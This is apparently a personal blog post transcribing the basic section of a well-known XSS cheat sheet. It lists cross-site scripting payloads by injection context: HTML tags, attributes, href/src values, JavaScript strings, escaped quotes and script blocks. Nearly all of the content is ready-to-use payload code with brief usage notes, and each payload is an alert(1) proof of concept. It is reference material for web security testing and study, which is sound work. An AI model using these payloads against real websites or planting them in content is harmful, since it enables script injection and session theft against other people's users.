# Introduction  

I downloaed a pdf file XSS CHEAT SHEET from [https://brutelogic.com.br/blog/](https://brutelogic.com.br/blog/) for 2 months ago. I was planning to read it but I was lazy. So write it down seem like the good choice to "read" and also share with everyone who interested. This cheat sheet has 5 parts including:

1. Basic  
2. Advanced  
3. Filter Bypass  
4. Exploitation  
5. Miscellaneous  

This post is the 1st part(Basic).  

# Basic  

#### HTML Context - Simple Tag Injection  
Use when input lands inside an attribue's value of an HTML tag or outside tag except the ones described in next case.  

```sh  
<svg onload=alert(1) >
"><svg onload=alert(1)>
```  

#### HTML Context - In Block Tag Injection  
Use when input lands inside or between opening/closing of the tags:
```sh  
<title><style><script><textaea><noscript><pre><xmp> and <iframe>( </tag> is accordingly)  
```  

```sh  
</tag><svg onload=alert(1)>
"></tag><svg onload=alert(1)>  
```  

#### HTML Context - Inline Injection  
Use when input lands inside an attribute's value of an HTML tag but tag can't be terminated by greater than sign(>)  

```sh  
"onmouseover=alert(1)//  
"autofocus/onfocus=alert(1)//  
```  

### HTML Context - Source Injection  
Use when input lands as a value of the following HTML tag attributes: ```href, src, data or action``` (also formaction). For src in script tag use an external script call (URL) or "data:,alert(1)". 2nd payload below alerts out of target's context for Webkit browsers.  

```sh  
javascript:alert(1)
data:text/html,<svg onload=alert(1)>  
```  

#### Javascript Context - Code Injection  
Use when input lands in a script block, inside string delimited value.  

```sh  
'-alert(1)-'  
'-alert(1)//
```  

#### Javascript Context - Code Injection with Escape Bypass  
Use when input lands in a script block, inside a string delimited value but quotes are escaped by a blackslash.  

```sh  
\'-alert(1)//  
```  

#### Javascript Context - Code Injection in Logical Block  
Use 1st or 2nd payloads when input lands in a script block, inside a string delimited value and inside a single logical block like function or conditional(if, else, etc). If quote is excaped with a blackshash, use 3rd payload.  

```sh  
'}alert(1);{'
'}alert(1)%0A{'
\'}alert(1);{//
```  

#### Javascript Context - Tag Injection  
Use when input lands anywhere in a script block.  

```sh  
</script><svg onload=alert(1)>
```  



